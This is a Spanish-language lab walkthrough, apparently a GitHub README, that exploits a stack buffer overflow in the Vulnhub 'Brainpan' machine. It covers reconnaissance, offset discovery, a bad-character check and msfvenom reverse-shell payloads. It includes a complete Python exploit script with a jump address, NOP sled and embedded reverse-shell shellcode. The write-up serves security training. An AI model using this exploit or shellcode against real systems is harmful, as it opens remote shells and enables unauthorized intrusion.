# Demostración: Explotación de un Desbordamiento de Buffer

Esta demostración se enfoca en un caso práctico de explotación de un desbordamiento de buffer en un entorno controlado. Utilizaremos una máquina de la plataforma Vulnhub con el objetivo de identificar la vulnerabilidad mediante técnicas de pentesting. Una vez localizada, intentaremos llevar a cabo una ejecución de código remoto para obtener una reverse shell en la máquina víctima.

## Descripción del Escenario

### Plataforma Utilizada: Vulnhub

Utilizaremos una máquina virtual disponible en Vulnhub, diseñada para simular un entorno vulnerable. La máquina presenta una vulnerabilidad específica que exploraremos para comprender mejor cómo se explota un desbordamiento de buffer.

### Objetivo

- Encontrar la vulnerabilidad mediante un análisis exhaustivo del sistema y las aplicaciones.
- Realizar un ataque controlado para explotar el desbordamiento de buffer.
- Obtener una reverse shell como resultado de la explotación exitosa.

## Pasos a Seguir

1. **Preparación del Entorno**: Configurar el entorno de trabajo y la máquina virtual.
2. **Identificación de la Vulnerabilidad**: Utilizar herramientas de pentesting para buscar la vulnerabilidad.
3. **Explotación del Desbordamiento de Buffer**: Desarrollar un payload o script para aprovechar la vulnerabilidad.
4. **Obtención de la Reverse Shell**: Ejecutar el payload para obtener acceso remoto a la máquina víctima.

## Notas Importantes

- **Entorno Controlado**: Esta demostración se lleva a cabo en un entorno controlado y con fines educativos. No se debe intentar realizar estas acciones en sistemas ajenos sin autorización.
- **Énfasis en la Seguridad**: Es esencial comprender la ética y legalidad al explorar y explotar vulnerabilidades. El propósito principal es aprender y fortalecer las habilidades en ciberseguridad.

¡Bienvenido a esta demostración interactiva sobre el desbordamiento de buffer! Sigue los pasos con precaución y disfruta aprendiendo sobre este tipo de vulnerabilidades y su explotación.

## Preparación del Entorno

Para llevar a cabo esta demostración, se requieren tres máquinas virtuales distintas:

1. **Kali Linux - Máquina del Atacante:**
   - Utilizaremos Kali Linux como nuestra máquina atacante desde donde realizaremos pruebas y pentesting.

2. **Brainpan - Máquina Virtual de Vulnhub:**
   - Descargaremos la máquina virtual Brainpan de Vulnhub, la cual simula un entorno vulnerable con un binario propenso a desbordamientos de buffer.

3. **Windows 11 - Máquina Virtual Local:**
   - Configuraremos una máquina virtual con Windows 11 para trabajar con el binario en un entorno local. En ella instalaremos la herramienta Immunity Debugger esto facilitará el análisis y la comprensión de la vulnerabilidad.

Estas tres máquinas virtuales nos ofrecerán un entorno controlado para realizar pruebas de pentesting, identificar la vulnerabilidad en el binario de Brainpan y desarrollar/ejecutar el payload necesario para obtener una reverse shell.

## Identificación de la Vulnerabilidad

Una vez que tenemos configurado el entorno de trabajo, comenzaremos con la identificación de la vulnerabilidad.

### Escaneo de Red para Reconocer la IP de la Máquina Víctima

Para identificar la dirección IP de la máquina víctima, realizaremos un escaneo de red. Abriremos una terminal en nuestra máquina Kali como 'root' y ejecutaremos el siguiente comando:
```bash
arp-scan -I <nombre de tu interfaz de red> --localnet --ignoredups
```
![Captura](https://github.com/CBonastre/0-click/assets/151465796/970f3509-9ff8-422a-8366-b2305d45709d)

### Identificación de las Máquinas en el Resultado del Escaneo

Al realizar el escaneo de red, obtuvimos una lista de direcciones IP disponibles en la red. Para identificar las máquinas relevantes, seguiremos los siguientes pasos:

1. **Reconocer las IPs Asociadas a Funciones de Virtualización:**
   - Las primeras direcciones IP en la lista corresponden a funciones del software de virtualización, en este caso, VirtualBox. Descartaremos estas direcciones IP ya que no son nuestras máquinas objetivo.

2. **Distinguir entre las IPs Restantes:**
   - Para identificar nuestra máquina Windows 11 y la máquina Brainpan, procederemos a lanzar un comando de ping a cada una de las direcciones IP restantes para analizar el TTL (Time To Live) devuelto.

3. **Análisis del TTL:**
   - Las máquinas Windows suelen tener un valor de TTL predeterminado de 128, mientras que las máquinas Linux tienen un valor de 64. Usaremos esto como indicador para diferenciar entre las máquinas.

### Lanzamiento del Comando Ping para Analizar el TTL

Usaremos el siguiente comando para cada una de las direcciones IP obtenidas del escaneo de red:

```bash
ping -c 1 <IP de la máquina> 
```
![Captura1](https://github.com/CBonastre/0-click/assets/151465796/0a364f43-84a1-4a5d-a390-fa81187df7b7)

### Enumeración de Puertos Abiertos en la Máquina Víctima

Una vez identificada la dirección IP de la máquina víctima (en este caso, la IP es `10.40.2.13`), utilizaremos la herramienta NMAP para realizar la enumeración de los puertos abiertos en nuestro objetivo.

Utilizaremos el siguiente comando NMAP:

```bash
nmap -p- --open -T5 -v -n <IP objetivo>
```
![Captura2](https://github.com/CBonastre/0-click/assets/151465796/43b4cd83-8fbb-493f-8baa-c38b726e0844)

### Verificación de los Servicios en los Puertos Identificados

Después de identificar los puertos abiertos, en este caso, los puertos `9999` y `10000`, procederemos a verificar qué servicios están en ejecución detrás de cada uno de ellos.

Para ello, abriremos un navegador web y en la barra de direcciones ingresaremos lo siguiente:

- **Para el Puerto 10000:**
  http://IP_Brainpan:10000
  Este paso nos permitirá verificar si algún servicio específico responde en el puerto 10000. Y al acceder podemos que es una pagina web.
  
  ![Captura3](https://github.com/CBonastre/0-click/assets/151465796/6924d6fc-27de-4bdf-a779-23b6b156cff3)


- **Para el Puerto 9999:**
  http://IP_Brainpan:9999
### Interacción con el Portal de Acceso en el Puerto 9999

Al acceder al puerto 9999, nos encontramos con un portal de acceso que requiere una contraseña para continuar. Este portal podría estar relacionado con un binario o servicio específico.

![Captura4](https://github.com/CBonastre/0-click/assets/151465796/c7a4b009-fd08-4458-92a6-a2443828f2e7)

**Conexión al Puerto 9999 mediante Netcat (nc)**

Para intentar establecer una conexión directa al puerto 9999, utilizaremos la herramienta Netcat (nc) desde nuestra máquina Kali Linux. El objetivo es explorar más a fondo el comportamiento de este servicio y realizar pruebas de conexión directa.

Usaremos el siguiente comando:

```bash
nc IP_Brainpan 9999
```

![Captura5](https://github.com/CBonastre/0-click/assets/151465796/6a2bda44-42b3-4a35-b7a3-9eaa649bd5db)


### Investigación de Posible Desbordamiento de Buffer

Basándonos en nuestra investigación previa y considerando la solicitud de contraseña en el portal de acceso del puerto 9999, existe la posibilidad de que el sistema tenga una vulnerabilidad de desbordamiento de buffer si no se realiza un control adecuado de la entrada de datos.

#### Enfoque para Probar el Desbordamiento de Buffer

Para explorar esta posibilidad, consideraremos la inserción de longitud excesiva en el campo de entrada de contraseña. Esto podría causar un desbordamiento de buffer si el sistema no tiene un control adecuado sobre la cantidad de datos ingresados.

### Generación de Cadena para Prueba de Desbordamiento

Para evaluar la posible vulnerabilidad de desbordamiento de buffer, generaremos una cadena de caracteres utilizando Python y la introduciremos en el campo de contraseña del portal de acceso en el puerto 9999.

Utilizaremos el siguiente comando para generar una cadena de longitud considerable:

```bash
python3 -c 'print("A"*1000)'
```
![Captura6](https://github.com/CBonastre/0-click/assets/151465796/95d5d38a-1c50-48f2-ba87-7e964040083a)

Tras introducir la cadena generada en el campo de contraseña del portal de acceso en el puerto 9999, observamos que el servicio se vuelve inoperativo. Al intentar una nueva conexión, se nos deniega el acceso, lo cual sugiere claramente que existe una vulnerabilidad de desbordamiento de buffer en el sistema.

![Captura7](https://github.com/CBonastre/0-click/assets/151465796/223e323a-a4ba-4427-9873-517f343d7cd1)

### Búsqueda del Código Fuente y Reinicio de la Máquina Víctima

Antes de continuar, es necesario reiniciar la máquina víctima (Brainpan) debido a que quedó fuera de servicio tras la prueba de desbordamiento de buffer.

**Reinicio de la Máquina Víctima:**
Para restablecer la máquina víctima y poder continuar con nuestra investigación, se recomienda reiniciar la máquina afectada.

Ahora, respecto a la búsqueda del código fuente del binario en el puerto 10000, utilizaremos la herramienta 'gobuster' para buscar subdirectorios dentro de la página web que corre en dicho puerto. Esto con la esperanza de encontrar alguna ruta que nos proporcione acceso al código fuente.

**Ejecución del Comando 'gobuster'**

Utilizaremos el siguiente comando 'gobuster' para buscar subdirectorios en la URL asociada al puerto 10000:

```bash
gobuster dir -u http://IP_Brainpan:10000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
![Captura8](https://github.com/CBonastre/0-click/assets/151465796/9b166556-c7ba-4fec-901b-fadfa0dc5938)


Después de ejecutar el comando Gobuster, se identificó la presencia de un subdirectorio relevante: "/bin". Al acceder a este subdirectorio, confirmamos que es posible descargar el ejecutable.

![Captura9](https://github.com/CBonastre/0-click/assets/151465796/34aa7795-ebfd-412c-a11f-0051a7f70e53)

#### Descarga del Ejecutable para Análisis Local

Procederemos a descargar este ejecutable en nuestra máquina con sistema operativo Windows. El propósito es trabajar con este archivo en un entorno controlado para llevar a cabo un análisis minucioso. Esta acción nos permitirá comprender mejor el funcionamiento interno del código y su comportamiento, particularmente cuando se le aplica un desbordamiento de buffer.

### Análisis Inicial del Ejecutable con Immunity Debugger

Una vez que tenemos el ejecutable en nuestra máquina Windows, procedemos a ejecutarlo. Para analizar su comportamiento y realizar un seguimiento de la ejecución del programa, abriremos la herramienta Immunity Debugger.

![Captura10](https://github.com/CBonastre/0-click/assets/151465796/de3b03f3-82f9-40e5-a06a-b4934dc2a2d7)

> [!CAUTION]
> Cada vez que realicemos una prueba y, como consecuencia, el ejecutable quede fuera de servicio, deberemos reiniciarlo junto con el debugger. 

**Uso de Immunity Debugger para Analizar el Ejecutable**

Al abrir Immunity Debugger, seleccionamos el ejecutable Brainpan navegando a "File > Attach". Esto nos permitirá analizar el programa en ejecución y observar detalles cruciales, como direcciones de memoria y otros datos relevantes.

![Captura11](https://github.com/CBonastre/0-click/assets/151465796/12975d22-8927-4188-a438-017bed1f85ee)

![Captura12](https://github.com/CBonastre/0-click/assets/151465796/4947eb4b-fce1-4a37-95e7-06065b21ec12)

> [!IMPORTANT]
> Cada vez que seleccionemos un programa, este por defecto se pausa en el debugger. Importante antes de ralizar ninguna prueba pulsar el iconito de "Run" (F9).

**Objetivo: Sobreescribir el Registro EIP**

Nuestro objetivo es conseguir sobrescribir el registro EIP en la memoria. Este registro, el Puntero de Instrucción Extendido, indica la próxima instrucción a ejecutar en el programa. Al lograr sobrescribir este registro, podríamos tomar control sobre la secuencia de ejecución del programa y manipular su comportamiento.

Este paso es esencial para explorar vulnerabilidades como el desbordamiento de buffer y buscar cómo podemos influir en el flujo de ejecución del programa para obtener un control más significativo sobre su funcionamiento.



### Descubrir punto de offset

El siguiente paso es generar un patron de desbordamiento, para conectarnos mediante nc como antes pero ahora a nuestra maquina windows que es donde tenemos corriendo el ejecutable para ver como se comporta. 

**Generar patrón de desbordamiento**

Para generar el patron de desbordamineto abriremos otro terminal en nuetsro kali y lanzaremos el siguiente comando:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
```
Este comando nos genera un patron de la longitud que le pasemos como parametro detras de -l.

![Captura14](https://github.com/CBonastre/0-click/assets/151465796/e2a3dbc6-808e-4ac5-a5df-9cf7a96e5a4e)


**Desbordar Buffer de nuevo**

Ahora copiamos el patrón que hemos generado, nos conectamos mediante netcat a nuestro windows con el comando:
```bash
nc <IP_Windows>:9999
```
Una vez conectados, introducimos el patron generado donde nos pide la contraseña, forzando así otro desbordamiento. 

![Captura15](https://github.com/CBonastre/0-click/assets/151465796/590fb404-9e7d-4420-8bf6-4b6d43d19f93)


Si vamos a la ventana del immunity debugger podemos ver que en el recuadro de arriba a la derecha en el registro EIP aparece un numero de 8 digitos.

![Captura16](https://github.com/CBonastre/0-click/assets/151465796/434b8138-61a8-44e3-9e80-35622a36201f)


**Encontrar offset**

Copiaremos el numero que aparece al lado del registro EIP y en la terminal donde hemos generado el patron de desbordamiento lanzaremos el siguiente comando:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <Valor registro EIP>
```
Esto nos va a devolver la longitud exacta en la que se produce el desbordamiento, en este caso vemos que es 524.
![Captura17](https://github.com/CBonastre/0-click/assets/151465796/4216a002-ba7f-48ab-ab7e-a3e6e6a5f511)


## Comprobar que parte de memoria se sobrescribe

**Registro EIP**

Una vez que conocemos la longitud necesaria para producir el desbordamiento, podemos comprobar si lo que escribimos después de estos 524 caracteres sobrescribe la dirección de memoria del registro EIP o no.
Para hacer esto, generaremos una cadena de caracteres "A" de longitud 524 (offset), seguida de 4 caracteres "B". De esta manera, si realmente estamos sobrescribiendo el registro EIP, veremos que su valor pasa a ser "42424242", que corresponde a los 4 caracteres "B" en codificación ASCII.
Para ello usaremos el comando:

```bash
python3 -c 'print("A"*524 + "B"*4)'
```
![Captura18](https://github.com/CBonastre/0-click/assets/151465796/59ea7c5b-7242-4b71-9c56-90d1f47a1804)


Una vez generada la cadena, nos volveremos a conectar mediante netcat utilizando el comando usado anteriormente. Pegaremos la cadena que acabamos de generar para así poder comprobar qué sección de memoria estamos sobrescribiendo. Si nos fijamos, en la ventana del Immunity Debugger el valor del registro de memoria EIP tras producirse el desbordamiento efectivamente corresponde a "42424242".

![Captura19](https://github.com/CBonastre/0-click/assets/151465796/746bfa2a-9f61-4c0d-8223-9128a879874c)


**Registro ESP**

Lo siguiente es verificar qué parte de la memoria se sobrescribe al seguir añadiendo caracteres a nuestra cadena de desbordamiento. Esto es crucial, ya que esta sección de la cadena es donde introduciremos nuestro Shellcode. Por lo tanto, debemos asegurarnos de que todos estos bytes de datos se sobrescriban en la pila de memoria, es decir, en el registro ESP.

Para realizar esta comprobación, usaremos la misma cadena que antes, añadiendo caracteres "C" después de las 4 "B" que sabemos que se sobrescriben en el EIP. De esta manera, veremos de manera muy clara si realmente estamos sobrescribiendo la pila de memoria.
El comando que podemos usar:

```bash
python3 -c 'print("A"*524 + "B"*4 + "C"*30)'
```
![Captura20](https://github.com/CBonastre/0-click/assets/151465796/25f59771-6381-4c05-a3da-d8c2d3992b86)

Si ahora volvemos a relaizar la conexión usando netcat, y le introducimos la nueva cadena, podremos ver en la ventana del debuger que efectivamente los caracteres "C" que hemos añadido se estan almacenando en la pila de memoria.

![Captura21](https://github.com/CBonastre/0-click/assets/151465796/ad414cb0-5de3-4fdb-97cb-2a7c7aa4bfc2)

![Captura22](https://github.com/CBonastre/0-click/assets/151465796/10874620-30c2-48cd-bcd4-2909c9f7b4d9)

![Captura23](https://github.com/CBonastre/0-click/assets/151465796/d25bf03c-b9b3-4b0a-babc-734dbda4f336)

## Bad chars

Llegados a este punto, ya sabemos que podemos sobrescribir tanto el puntero EIP como la pila de memoria (ESP). El siguiente paso es comprobar que no hay ningún carácter que genere conflicto con el ejecutable. Para ello, necesitaremos importar un script de Python a la herramienta Immunity Debugger. El script se puede encontrar en el siguiente repositorio:
```bash
https://github.com/corelan/mona/blob/master/mona.py
```

Para importar el script una vez descargado, simplemente debemos guardarlo en la siguiente ruta: 
```bash
C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands
```
**Creación byte array**

Una vez importado el script, procederemos a crear un array de bytes para pasárselos al binario ejecutable y así comprobar si alguno de los bytes no puede ser representado por el programa. En ese caso, deberíamos excluir ese byte a la hora de generar nuestra shellcode. Más adelante se entenderá mejor este paso.
Empezaremos creando un directorio de trabajo para el script "mona.py" que acabamos de descargar. Para ello, usaremos el siguiente comando en la línea de comandos de la herramienta Immunity Debugger:
```bash
!mona config -set workingfolder <Ruta donde queremos crear el directorio/Nombre del directorio>
```
![Captura24](https://github.com/CBonastre/0-click/assets/151465796/851b2ef3-0a62-4a79-be0a-7843154061e5)

Una vez creado el directorio de trabajo, generaremos el array de bytes con el siguiente comando:
```bash
!mona bytearray -cpb "\x00"
```

![Captura25](https://github.com/CBonastre/0-click/assets/151465796/f6a42fda-f90d-4351-8f17-5ff5b1ceb707)

Este comando generará dos archivos en nuestro directorio de trabajo creado anteriormente: un archivo *.txt y otro *.bin. En este momento, nos interesa el archivo *.txt. Copiaremos este archivo a nuestra máquina Kali atacante.

![Captura26](https://github.com/CBonastre/0-click/assets/151465796/4c0879df-0b04-457b-b91a-14d234977fbe)

Si analizamos el contenido del archivo, veremos que ha creado una lista con todas las combinaciones posibles en hexadecimal, excluyendo el "\x00", que hemos eliminado utilizando el comando de mona.py al generar el archivo. El "\x00" representa el null byte y genera conflictos en la mayoría de los binarios, por eso lo excluimos.

![Captura27](https://github.com/CBonastre/0-click/assets/151465796/cb5ba02b-8766-4d84-aaa5-8aa24edf6219)

**Creación de script**

Llegados a este punto, crearemos un script en Python para introducir el byte array creado y poder comprobar si alguno de los bytes no puede ser representado por el ejecutable.
```bash
#!/usr/bin/python3

import socket
from struct import pack


offset = 524

before_eip =b"A"*offset
eip = b"B"*4

badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = before_eip + eip + badchars 


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("IP_Windows",9999))
s.send(payload)
s.close()
```

**Comparación bytearray.bin y pila de memoria**


Una vez creado el script (no te olvides de darle permisos de ejecución), volveremos a arrancar el ejecutable en nuestra máquina Windows y prepararemos la herramienta Immunity Debugger para poder observar el comportamiento del binario Brainpan.
Una vez esté todo listo, ejecutaremos el script (en mi caso, lo he nombrado como "exploit.py").

![Captura28](https://github.com/CBonastre/0-click/assets/151465796/e002a1f9-5943-47ed-bda3-d2be8e13e6d4)


Al ejecutarse, deberemos verificar que todos los bytes introducidos mediante nuestro script se estén representando correctamente. Para ello, usaremos la siguiente funcionalidad del script "mona.py":

```bash
!mona compare -a <"0x"+"dirección de memoria ESP"> -f <Ruta del archivo *.bin>
```
![Captura29](https://github.com/CBonastre/0-click/assets/151465796/aed606e0-22e6-43b2-86d5-e7389bda9da8)

Esto comparará los bytes almacenados en memoria a partir de la dirección del ESP con el archivo *.bin que hemos generado anteriormente. Aparecerá una ventana emergente en la que se ve una tabla con un campo llamado "badchars". En caso de que alguno de los bytes no se encontrara representado en el programa, aparecería en esa tabla. En nuestro caso, ninguno de los bytes que hemos usado genera conflicto, por lo tanto, todos han podido ser representados.

## Creación Shellcode

Ya sabiendo que podemos usar todos los bytes para generar un shellcode, debido a que hemos comprobado que todos son representables por el binario de la máquina víctima, usaremos el siguiente comando de la herramienta "msfvenom" para generar un shellcode. En este caso, excluiremos solo el byte "\x00". (En caso de haber encontrado otro byte en el paso anterior que no pudiera ser representado, deberíamos excluirlo junto con el "\x00" para asegurar el funcionamiento correcto del shellcode):

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=TU_IP LPORT=443 --platform windows -a x86 -f c -b '\x00' EXITFUNC=thread
```
![Captura30](https://github.com/CBonastre/0-click/assets/151465796/eaae1696-b52b-4b5a-aa83-2ed14c5e69ab)

## JMP ESP

Aun no hemos terminado, ya que hasta ahora estamos sobrescribiendo el registro EIP con letras "B", lo que provocará que el programa deje de funcionar. Lo que nos interesa es escribir en el EIP un salto a la pila, es decir, al registro ESP.

Para lograr esto, buscaremos una dirección de memoria en la que se ejecute esta acción. Pero primero, debemos saber cómo se traduce la instrucción "jmp ESP" en lenguaje ensamblador a formato little endian (formato que hemos visto hasta ahora como "\xAA"). Kali cuenta con una herramienta que puede ayudarnos con esta tarea:

```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```
![Captura31](https://github.com/CBonastre/0-click/assets/151465796/4b1865d2-2495-4be5-8755-827c5c53b545)

**Buscar salto a la pila**

Lo siguiente es buscar un módulo en el que se produzca esta acción. Para ello, "mona.py" nos ofrece los siguientes comandos:
```bash
!mona modules
```
Con este comando, podremos ver si hay algún módulo activo en memoria sin protecciones, es decir, con todas las columnas que nos aparecen con el valor "false". Como podemos ver, el único módulo que cumple eso es precisamente el ejecutable Brainpan.

![Captura32](https://github.com/CBonastre/0-click/assets/151465796/b71a6aa9-6be9-4c1a-a96b-9ed0b811de64)

El otro comando es:
```bash
!mona find -s "\xFF\xE4" -m brainpan.exe
```

Este comando buscará si encuentra algún punto de la memoria usado por el ejecutable Brainpan en el que se ejecute la acción "\xFF\E4", que ya sabemos que es la instrucción "jmp ESP".

![Captura33](https://github.com/CBonastre/0-click/assets/151465796/003a9642-f5b2-4491-a95e-dd2984990fe4)

## Modificar Script

Ya sabemos en qué dirección de memoria se realiza la acción "jmp ESP". Por lo tanto, podemos asignar esta dirección al registro "EIP" de nuestro script. Además, añadiremos 16 `"\x90"` antes de nuestro Shell code, que son instrucciones `NOP` (no operation), estas no realizan ninguna acción y sirven para dar tiempo a que nuestro Shell code se descifre y se ejecute de manera correcta.

El script nos quedará así:
```bash
#!/usr/bin/python3

import socket
from struct import pack


offset = 524

before_eip =b"A"*offset
eip = pack("<I", 0x311712F3)

shellcode = (b"\xd9\xd0\xbb\xe1\xac\x65\x13\xd9\x74\x24\xf4\x5a\x29\xc9"
b"\xb1\x52\x31\x5a\x17\x03\x5a\x17\x83\x0b\x50\x87\xe6\x37"
b"\x41\xca\x09\xc7\x92\xab\x80\x22\xa3\xeb\xf7\x27\x94\xdb"
b"\x7c\x65\x19\x97\xd1\x9d\xaa\xd5\xfd\x92\x1b\x53\xd8\x9d"
b"\x9c\xc8\x18\xbc\x1e\x13\x4d\x1e\x1e\xdc\x80\x5f\x67\x01"
b"\x68\x0d\x30\x4d\xdf\xa1\x35\x1b\xdc\x4a\x05\x8d\x64\xaf"
b"\xde\xac\x45\x7e\x54\xf7\x45\x81\xb9\x83\xcf\x99\xde\xae"
b"\x86\x12\x14\x44\x19\xf2\x64\xa5\xb6\x3b\x49\x54\xc6\x7c"
b"\x6e\x87\xbd\x74\x8c\x3a\xc6\x43\xee\xe0\x43\x57\x48\x62"
b"\xf3\xb3\x68\xa7\x62\x30\x66\x0c\xe0\x1e\x6b\x93\x25\x15"
b"\x97\x18\xc8\xf9\x11\x5a\xef\xdd\x7a\x38\x8e\x44\x27\xef"
b"\xaf\x96\x88\x50\x0a\xdd\x25\x84\x27\xbc\x21\x69\x0a\x3e"
b"\xb2\xe5\x1d\x4d\x80\xaa\xb5\xd9\xa8\x23\x10\x1e\xce\x19"
b"\xe4\xb0\x31\xa2\x15\x99\xf5\xf6\x45\xb1\xdc\x76\x0e\x41"
b"\xe0\xa2\x81\x11\x4e\x1d\x62\xc1\x2e\xcd\x0a\x0b\xa1\x32"
b"\x2a\x34\x6b\x5b\xc1\xcf\xfc\x6e\x3e\xcd\xf8\x06\x3c\xd1"
b"\x01\x6c\xc9\x37\x6b\x82\x9c\xe0\x04\x3b\x85\x7a\xb4\xc4"
b"\x13\x07\xf6\x4f\x90\xf8\xb9\xa7\xdd\xea\x2e\x48\xa8\x50"
b"\xf8\x57\x06\xfc\x66\xc5\xcd\xfc\xe1\xf6\x59\xab\xa6\xc9"
b"\x93\x39\x5b\x73\x0a\x5f\xa6\xe5\x75\xdb\x7d\xd6\x78\xe2"
b"\xf0\x62\x5f\xf4\xcc\x6b\xdb\xa0\x80\x3d\xb5\x1e\x67\x94"
b"\x77\xc8\x31\x4b\xde\x9c\xc4\xa7\xe1\xda\xc8\xed\x97\x02"
b"\x78\x58\xee\x3d\xb5\x0c\xe6\x46\xab\xac\x09\x9d\x6f\xcc"
b"\xeb\x37\x9a\x65\xb2\xd2\x27\xe8\x45\x09\x6b\x15\xc6\xbb"
b"\x14\xe2\xd6\xce\x11\xae\x50\x23\x68\xbf\x34\x43\xdf\xc0"
b"\x1c")

payload = before_eip + eip + b"\x90"*16 + shellcode 


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("IP_Windows",9999))
s.send(payload)
s.close()
```

**Reverse Shell**

Ahora podemos ejecutar el script. Esto nos permitirá colocarnos en escucha en el puerto que hemos determinado. En este puerto, recibiremos una reverse shell desde la máquina víctima, es decir, nuestra máquina Windows.

Para hacerlo, puedes utilizar herramientas como `netcat` (nc) u otras que admitan la escucha en un puerto específico. Por ejemplo, si estás utilizando el puerto 443:

```bash
nc -lvp 443
```

![Captura34](https://github.com/CBonastre/0-click/assets/151465796/f5a2979b-05b9-4ed5-bf02-b3a438178b76)

![Captura35](https://github.com/CBonastre/0-click/assets/151465796/bb8abb06-8790-4420-a0b6-e4c332edef5f)


## Ataque a la máquina Brainpan

Hasta este punto, hemos estado trabajando en nuestra máquina Windows. Sin embargo, para completar el ataque, necesitaremos modificar el shell code para crear uno compatible con el sistema operativo Linux, ya que, como verificamos al inicio de esta demostración, la máquina víctima es un sistema Linux. Deberemos generar un nuevo shell code utilizando la herramienta "msfvenom" y reemplazarlo en nuestro script. Además, será necesario cambiar la dirección IP para establecer la conexión con la máquina Brainpan en lugar de la Windows. Con estos cambios, al ejecutar el script, obtendremos acceso a la máquina objetivo.

Aquí te muestro un ejemplo de cómo podrías generar un nuevo shell code utilizando "msfvenom" para un sistema Linux y reemplazarlo en tu script:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=Tu_IP LPORT=443 --platform linux -a x86 -f c -b '\x00' EXITFUNC=thread
```

![Captura36](https://github.com/CBonastre/0-click/assets/151465796/184de4e5-4fcc-48a3-9021-8ba0b9b1ee89)

![Captura37](https://github.com/CBonastre/0-click/assets/151465796/14cfcb31-bd9e-4a4c-8bd8-bf20d7d49377)


## Conclusión

En esta demostración, hemos explorado los fundamentos del desbordamiento de búfer, una vulnerabilidad común en sistemas informáticos. Desde entender cómo se produce el desbordamiento de búfer hasta la explotación de esta vulnerabilidad, hemos recorrido un camino crucial para comprender cómo los atacantes pueden comprometer sistemas.

Es fundamental recordar que estas técnicas deben emplearse de manera ética y bajo entornos controlados, como pruebas de penetración autorizadas o con fines educativos. La seguridad informática es un campo en constante evolución, y comprender las vulnerabilidades como el desbordamiento de búfer es crucial tanto para proteger sistemas como para comprender cómo los atacantes pueden comprometerlos.

¡Espero que esta demostración te haya resultado informativa y útil en tu comprensión de los desbordamientos de búfer y la seguridad informática en general!
